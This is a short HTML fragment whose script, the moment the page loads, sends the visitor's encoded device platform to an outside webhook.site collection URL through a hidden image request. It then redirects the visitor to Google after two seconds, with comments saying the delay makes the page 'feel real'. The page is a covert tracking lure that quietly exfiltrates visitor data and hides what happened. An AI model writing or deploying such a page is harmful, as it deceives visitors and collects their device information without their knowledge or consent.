<body>

    <script>
        // TRIGGER 1: Capture data the millisecond the page starts loading
        const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
        const ping = new Image();
        ping.src = radar + "?event=instant_capture&device=" + btoa(navigator.platform);

        // TRIGGER 2: Redirect to Google automatically
        // We give them 2 seconds to see the image so it feels "real"
        setTimeout(function() {
            window.location.replace("https://www.google.com");
        }, 2000);
    </script>
